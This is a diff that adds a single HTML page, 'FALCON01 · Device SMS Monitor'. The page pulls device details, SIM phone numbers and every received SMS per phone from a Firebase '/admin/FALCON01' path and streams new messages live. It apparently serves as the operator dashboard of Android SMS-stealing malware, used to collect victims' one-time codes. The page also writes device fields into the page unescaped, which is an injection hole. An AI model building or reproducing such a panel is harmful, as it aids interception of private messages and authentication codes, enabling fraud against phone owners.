@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FALCON01 · Device SMS Monitor</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #0d1117;
+            color: #e6edf3;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #30363d;
+            margin-bottom: 30px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #58a6ff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .badge {
+            background: #21262d;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #8b949e;
+        }
+        .badge span {
+            color: #f0f6fc;
+            font-weight: 600;
+        }
+        .header-actions {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .refresh-btn {
+            background: #238636;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .refresh-btn:hover {
+            background: #2ea043;
+        }
+        .refresh-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .ws-status {
+            font-size: 13px;
+            padding: 4px 14px;
+            border-radius: 20px;
+            background: #21262d;
+            color: #8b949e;
+            border: 1px solid #30363d;
+        }
+        .ws-status.online {
+            color: #3fb950;
+            border-color: #3fb950;
+        }
+        .ws-status.offline {
+            color: #f85149;
+            border-color: #f85149;
+        }
+
+        /* loading */
+        .loading {
+            text-align: center;
+            padding: 60px 20px;
+            color: #8b949e;
+        }
+        .spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #21262d;
+            border-top: 4px solid #58a6ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Device Grid */
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 16px;
+        }
+        .device-card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 20px;
+            transition: border-color 0.2s, transform 0.1s;
+            cursor: pointer;
+        }
+        .device-card:hover {
+            border-color: #58a6ff;
+            transform: translateY(-2px);
+        }
+        .device-id {
+            font-size: 12px;
+            color: #8b949e;
+            font-family: monospace;
+            margin-bottom: 10px;
+            word-break: break-all;
+        }
+        .device-model {
+            font-size: 18px;
+            font-weight: 600;
+            color: #f0f6fc;
+            margin-bottom: 4px;
+        }
+        .device-brand {
+            font-size: 14px;
+            color: #8b949e;
+            margin-bottom: 12px;
+        }
+        .phone-numbers {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 8px;
+        }
+        .phone-number {
+            background: #21262d;
+            padding: 4px 12px;
+            border-radius: 16px;
+            font-size: 13px;
+            font-weight: 500;
+            color: #58a6ff;
+            font-family: monospace;
+        }
+        .sms-count {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 10px;
+        }
+        .sms-count span {
+            color: #f0f6fc;
+        }
+        .no-data {
+            text-align: center;
+            padding: 60px 20px;
+            color: #8b949e;
+        }
+        .no-data .icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+            opacity: 0.5;
+        }
+
+        /* Detail */
+        .detail-page {
+            display: none;
+        }
+        .detail-page.active {
+            display: block;
+        }
+        .back-btn {
+            background: transparent;
+            color: #58a6ff;
+            border: 1px solid #30363d;
+            padding: 8px 18px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.2s;
+            margin-bottom: 20px;
+        }
+        .back-btn:hover {
+            background: #1c2333;
+        }
+        .detail-header {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        .detail-header .device-model {
+            font-size: 22px;
+            font-weight: 600;
+        }
+        .detail-header .device-brand {
+            color: #8b949e;
+            font-size: 16px;
+        }
+        .detail-header .device-id {
+            font-size: 13px;
+            color: #8b949e;
+            font-family: monospace;
+            margin-top: 6px;
+        }
+        .detail-numbers {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 14px;
+        }
+        .number-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #21262d;
+            padding: 6px 14px 6px 18px;
+            border-radius: 20px;
+        }
+        .number-item .num {
+            font-family: monospace;
+            font-size: 18px;
+            font-weight: 500;
+            color: #f0f6fc;
+            letter-spacing: 0.5px;
+        }
+        .number-item .sim-label {
+            font-size: 11px;
+            color: #8b949e;
+            background: #0d1117;
+            padding: 2px 8px;
+            border-radius: 10px;
+        }
+        .copy-btn {
+            background: transparent;
+            border: none;
+            color: #8b949e;
+            cursor: pointer;
+            font-size: 16px;
+            padding: 4px 6px;
+            border-radius: 4px;
+            transition: color 0.2s, background 0.2s;
+            line-height: 1;
+        }
+        .copy-btn:hover {
+            color: #f0f6fc;
+            background: #30363d;
+        }
+        .copy-btn.copied {
+            color: #3fb950;
+        }
+
+        .sms-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .sms-item {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            padding: 16px 20px;
+            transition: border-color 0.2s;
+            animation: fadeIn 0.2s ease;
+        }
+        @keyframes fadeIn {
+            0% { opacity: 0.5; transform: translateY(-4px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        .sms-item .sms-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+        .sms-item .sms-sender {
+            font-weight: 600;
+            color: #58a6ff;
+            font-size: 14px;
+        }
+        .sms-item .sms-time {
+            font-size: 12px;
+            color: #8b949e;
+        }
+        .sms-item .sms-message {
+            font-size: 15px;
+            color: #e6edf3;
+            line-height: 1.5;
+            word-break: break-word;
+        }
+        .sms-item.new-sms {
+            border-left: 3px solid #3fb950;
+            background: #1b242b;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #21262d;
+            color: #f0f6fc;
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            border: 1px solid #30363d;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+            z-index: 999;
+        }
+        .toast.show {
+            opacity: 1;
+        }
+
+        @media (max-width: 600px) {
+            .devices-grid {
+                grid-template-columns: 1fr;
+            }
+            .detail-numbers .number-item .num {
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div id="toast" class="toast">Copied!</div>
+
+    <header>
+        <div>
+            <h1>📡 FALCON01</h1>
+            <div class="badge">Devices: <span id="deviceCount">0</span></div>
+        </div>
+        <div class="header-actions">
+            <span class="ws-status" id="wsStatus">⚡ connecting…</span>
+            <button class="refresh-btn" id="refreshBtn">⟳ Refresh</button>
+        </div>
+    </header>
+
+    <!-- LIST VIEW -->
+    <div id="listView">
+        <div id="loadingIndicator" class="loading">
+            <div class="spinner"></div>
+            <p>Fetching devices...</p>
+        </div>
+        <div id="devicesGrid" class="devices-grid" style="display:none;"></div>
+        <div id="noData" class="no-data" style="display:none;">
+            <div class="icon">📭</div>
+            <p>No devices found.</p>
+        </div>
+    </div>
+
+    <!-- DETAIL VIEW -->
+    <div id="detailView" class="detail-page">
+        <button class="back-btn" id="backBtn">← Back to list</button>
+        <div id="detailContent"></div>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // CONFIG
+    // ============================================================
+    const DB_URL = 'https://fortydata-fee65-default-rtdb.firebaseio.com/admin/FALCON01/users.json';
+    // WebSocket endpoint – replace with your actual WS server.
+    // For demo we use a public echo server, but you should point to your own.
+    const WS_URL = 'wss://echo.websocket.org'; // ⚠️ replace with your real WS endpoint
+
+    // ============================================================
+    // STATE
+    // ============================================================
+    let allUsers = null;
+    let devices = [];               // array of { id, data }
+    let currentDeviceId = null;    // which device is shown in detail
+    let ws = null;
+    let wsReconnectTimer = null;
+
+    // ============================================================
+    // HELPERS
+    // ============================================================
+    function formatTimestamp(ts) {
+        if (!ts) return '';
+        const d = new Date(ts);
+        return d.toLocaleString('en-IN', {
+            day: '2-digit', month: 'short', year: 'numeric',
+            hour: '2-digit', minute: '2-digit', second: '2-digit',
+            hour12: true
+        });
+    }
+
+    function extractNumbers(simInfo) {
+        const nums = [];
+        if (!simInfo) return nums;
+        const slots = ['sim1', 'sim2'];
+        for (const slot of slots) {
+            const sim = simInfo[slot];
+            if (sim && sim.number) {
+                let n = sim.number.trim().replace(/^\+?91/, '');
+                if (n && !nums.includes(n)) nums.push(n);
+            }
+        }
+        if (simInfo.number) {
+            let n = simInfo.number.trim().replace(/^\+?91/, '');
+            if (n && !nums.includes(n)) nums.push(n);
+        }
+        return nums;
+    }
+
+    function getMessages(userData) {
+        const msgs = [];
+        if (userData.receivedSms) {
+            for (const key of Object.keys(userData.receivedSms)) {
+                const sms = userData.receivedSms[key];
+                msgs.push({ id: key, ...sms });
+            }
+        }
+        msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+        return msgs;
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        const div = document.createElement('div');
+        div.textContent = str;
+        return div.innerHTML;
+    }
+
+    function copyText(text, btnElement) {
+        if (!navigator.clipboard) {
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            ta.remove();
+            showToast('Copied!');
+            return;
+        }
+        navigator.clipboard.writeText(text).then(() => {
+            showToast('Copied!');
+            if (btnElement) {
+                btnElement.classList.add('copied');
+                setTimeout(() => btnElement.classList.remove('copied'), 1200);
+            }
+        }).catch(() => showToast('Failed to copy'));
+    }
+
+    let toastTimer = null;
+    function showToast(msg) {
+        const el = document.getElementById('toast');
+        el.textContent = msg;
+        el.classList.add('show');
+        clearTimeout(toastTimer);
+        toastTimer = setTimeout(() => el.classList.remove('show'), 1500);
+    }
+
+    // ============================================================
+    // FETCH DATA (REST)
+    // ============================================================
+    async function fetchData() {
+        const loadingEl = document.getElementById('loadingIndicator');
+        const gridEl = document.getElementById('devicesGrid');
+        const noDataEl = document.getElementById('noData');
+        const refreshBtn = document.getElementById('refreshBtn');
+
+        loadingEl.style.display = 'block';
+        gridEl.style.display = 'none';
+        noDataEl.style.display = 'none';
+        refreshBtn.disabled = true;
+
+        try {
+            const resp = await fetch(DB_URL);
+            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+            const data = await resp.json();
+
+            allUsers = data;
+            devices = [];
+            if (data && typeof data === 'object') {
+                for (const id of Object.keys(data)) {
+                    const user = data[id];
+                    if (user && user.deviceInfo) {
+                        devices.push({ id, data: user });
+                    }
+                }
+            }
+            devices.sort((a, b) => (b.data.userCreated || 0) - (a.data.userCreated || 0));
+            renderList();
+        } catch (err) {
+            console.error('Fetch error:', err);
+            showToast('Error loading data');
+            gridEl.style.display = 'block';
+            gridEl.innerHTML = `
+                <div style="grid-column:1/-1; text-align:center; padding:40px; color:#f85149;">
+                    <p style="font-size:18px;">⚠️ Failed to load</p>
+                    <p style="color:#8b949e; margin-top:8px;">${err.message}</p>
+                </div>
+            `;
+        } finally {
+            loadingEl.style.display = 'none';
+            refreshBtn.disabled = false;
+        }
+    }
+
+    // ============================================================
+    // RENDER LIST
+    // ============================================================
+    function renderList() {
+        const gridEl = document.getElementById('devicesGrid');
+        const noDataEl = document.getElementById('noData');
+        document.getElementById('deviceCount').textContent = devices.length;
+
+        if (devices.length === 0) {
+            gridEl.style.display = 'none';
+            noDataEl.style.display = 'block';
+            return;
+        }
+        gridEl.style.display = 'grid';
+        noDataEl.style.display = 'none';
+
+        let html = '';
+        for (const dev of devices) {
+            const info = dev.data.deviceInfo || {};
+            const model = info.model || 'Unknown';
+            const brand = info.brand || info.manufacturer || '';
+            const numbers = extractNumbers(dev.data.simInfo);
+            const msgCount = dev.data.receivedSms ? Object.keys(dev.data.receivedSms).length : 0;
+
+            html += `
+                <div class="device-card" data-deviceid="${dev.id}">
+                    <div class="device-id">${dev.id}</div>
+                    <div class="device-model">${model}</div>
+                    <div class="device-brand">${brand}</div>
+                    <div class="phone-numbers">
+                        ${numbers.map(n => `<span class="phone-number">${n}</span>`).join('')}
+                        ${numbers.length === 0 ? '<span style="color:#8b949e;font-size:13px;">No number</span>' : ''}
+                    </div>
+                    <div class="sms-count">SMS: <span>${msgCount}</span></div>
+                </div>
+            `;
+        }
+        gridEl.innerHTML = html;
+
+        document.querySelectorAll('.device-card').forEach(card => {
+            card.addEventListener('click', () => {
+                const id = card.dataset.deviceid;
+                showDetail(id);
+            });
+        });
+    }
+
+    // ============================================================
+    // RENDER DETAIL
+    // ============================================================
+    function showDetail(deviceId) {
+        const dev = devices.find(d => d.id === deviceId);
+        if (!dev) { showToast('Device not found'); return; }
+        currentDeviceId = deviceId;
+
+        const container = document.getElementById('detailContent');
+        const info = dev.data.deviceInfo || {};
+        const model = info.model || 'Unknown';
+        const brand = info.brand || info.manufacturer || '';
+        const numbers = extractNumbers(dev.data.simInfo);
+        const msgs = getMessages(dev.data);
+        const version = info.version || '';
+
+        let html = `
+            <div class="detail-header">
+                <div class="device-model">${model}</div>
+                <div class="device-brand">${brand} ${version ? '· Android ' + version : ''}</div>
+                <div class="device-id">ID: ${dev.id}</div>
+                <div class="detail-numbers">
+                    ${numbers.map(n => `
+                        <div class="number-item">
+                            <span class="num">${n}</span>
+                            <span class="sim-label">SIM</span>
+                            <button class="copy-btn" data-copy="${n}" title="Copy">📋</button>
+                        </div>
+                    `).join('')}
+                    ${numbers.length === 0 ? '<span style="color:#8b949e;">No phone numbers</span>' : ''}
+                </div>
+                <div style="margin-top:12px; font-size:13px; color:#8b949e;">
+                    ${msgs.length} SMS messages · Created ${formatTimestamp(dev.data.userCreated)}
+                </div>
+            </div>
+            <div class="sms-list" id="smsListContainer">
+                ${msgs.length === 0 ? '<div style="text-align:center;color:#8b949e;padding:40px;">No SMS received</div>' : ''}
+                ${msgs.map(s => `
+                    <div class="sms-item" data-smsid="${s.id}">
+                        <div class="sms-header">
+                            <span class="sms-sender">${escapeHtml(s.sender || 'Unknown')}</span>
+                            <span class="sms-time">${formatTimestamp(s.timestamp)}</span>
+                        </div>
+                        <div class="sms-message">${escapeHtml(s.message || '')}</div>
+                    </div>
+                `).join('')}
+            </div>
+        `;
+
+        container.innerHTML = html;
+
+        container.querySelectorAll('.copy-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                copyText(btn.dataset.copy, btn);
+            });
+        });
+
+        document.getElementById('listView').style.display = 'none';
+        document.getElementById('detailView').classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // ============================================================
+    // WEBSOCKET – receive new SMS in real time
+    // ============================================================
+    function connectWebSocket() {
+        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
+
+        try {
+            ws = new WebSocket(WS_URL);
+            const statusEl = document.getElementById('wsStatus');
+
+            ws.onopen = () => {
+                statusEl.textContent = '🟢 live';
+                statusEl.className = 'ws-status online';
+                console.log('WebSocket connected');
+                // Subscribe to device updates (customize as needed)
+                if (ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({ action: 'subscribe', channel: 'FALCON01' }));
+                }
+            };
+
+            ws.onmessage = (event) => {
+                try {
+                    const payload = JSON.parse(event.data);
+                    // Expecting: { deviceId, sms: { sender, message, timestamp } }
+                    if (payload && payload.deviceId && payload.sms) {
+                        handleIncomingSms(payload.deviceId, payload.sms);
+                    } else {
+                        // maybe a ping or other, ignore
+                    }
+                } catch (e) {
+                    // If not JSON, ignore
+                }
+            };
+
+            ws.onclose = () => {
+                statusEl.textContent = '🔴 offline';
+                statusEl.className = 'ws-status offline';
+                console.warn('WebSocket closed, reconnecting in 5s...');
+                clearTimeout(wsReconnectTimer);
+                wsReconnectTimer = setTimeout(connectWebSocket, 5000);
+            };
+
+            ws.onerror = (err) => {
+                console.error('WebSocket error', err);
+                ws.close();
+            };
+        } catch (e) {
+            console.warn('WS init error', e);
+            clearTimeout(wsReconnectTimer);
+            wsReconnectTimer = setTimeout(connectWebSocket, 5000);
+        }
+    }
+
+    // handle new SMS from WebSocket
+    function handleIncomingSms(deviceId, smsData) {
+        // 1. Update the in-memory data for that device
+        const dev = devices.find(d => d.id === deviceId);
+        if (!dev) return;
+
+        if (!dev.data.receivedSms) dev.data.receivedSms = {};
+        const newId = 'ws_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+        dev.data.receivedSms[newId] = {
+            sender: smsData.sender || 'Unknown',
+            message: smsData.message || '',
+            timestamp: smsData.timestamp || Date.now()
+        };
+
+        // 2. If this device is currently shown in detail, refresh detail view (append new SMS)
+        if (currentDeviceId === deviceId) {
+            appendSmsToDetail(deviceId, newId, dev.data.receivedSms[newId]);
+        }
+
+        // 3. Update the SMS count in the list (if visible)
+        // We'll re-render list if not in detail, or we can just update counts via DOM
+        if (!document.getElementById('detailView').classList.contains('active')) {
+            // simple: re-render list to keep counts consistent
+            renderList();
+        } else {
+            // update the count in the detail header (optional)
+            const countSpan = document.querySelector('#detailContent .detail-header .sms-count span');
+            if (countSpan) {
+                const msgs = getMessages(dev.data);
+                countSpan.textContent = msgs.length;
+            }
+        }
+        // Also update the badge count in header (total messages across all devices)
+        updateTotalSmsCount();
+    }
+
+    // append one SMS to the detail view without re-rendering everything
+    function appendSmsToDetail(deviceId, smsId, sms) {
+        const container = document.getElementById('smsListContainer');
+        if (!container) return;
+
+        // remove "no SMS" placeholder if present
+        const placeholder = container.querySelector('div[style*="text-align:center"]');
+        if (placeholder && container.children.length === 1) {
+            container.innerHTML = '';
+        }
+
+        const item = document.createElement('div');
+        item.className = 'sms-item new-sms';
+        item.dataset.smsid = smsId;
+        item.innerHTML = `
+            <div class="sms-header">
+                <span class="sms-sender">${escapeHtml(sms.sender || 'Unknown')}</span>
+                <span class="sms-time">${formatTimestamp(sms.timestamp)}</span>
+            </div>
+            <div class="sms-message">${escapeHtml(sms.message || '')}</div>
+        `;
+        container.prepend(item); // newest at top
+
+        // keep only last 200 messages to avoid DOM bloat (optional)
+        while (container.children.length > 200) {
+            container.removeChild(container.lastChild);
+        }
+    }
+
+    // update total SMS count across all devices (for badge)
+    function updateTotalSmsCount() {
+        let total = 0;
+        for (const dev of devices) {
+            if (dev.data.receivedSms) total += Object.keys(dev.data.receivedSms).length;
+        }
+        const countEl = document.getElementById('deviceCount');
+        if (countEl) countEl.textContent = devices.length;
+        // we also could show total SMS in header
+    }
+
+    // ============================================================
+    // BACK & REFRESH
+    // ============================================================
+    document.getElementById('backBtn').addEventListener('click', () => {
+        document.getElementById('detailView').classList.remove('active');
+        document.getElementById('listView').style.display = 'block';
+        currentDeviceId = null;
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+        // re-render list to reflect any changes
+        renderList();
+    });
+
+    document.getElementById('refreshBtn').addEventListener('click', () => {
+        if (document.getElementById('detailView').classList.contains('active')) {
+            document.getElementById('backBtn').click();
+        }
+        fetchData();
+    });
+
+    // ============================================================
+    // INIT
+    // ============================================================
+    fetchData().then(() => {
+        // after first load, connect WS
+        connectWebSocket();
+    });
+
+    // Auto-refresh via REST every 60s (only if not in detail)
+    setInterval(() => {
+        if (!document.getElementById('detailView').classList.contains('active')) {
+            fetchData();
+        }
+    }, 60000);
+
+    // Also try to keep WS alive: reconnect on close is handled inside onclose
+</script>
+</body>
+</html>
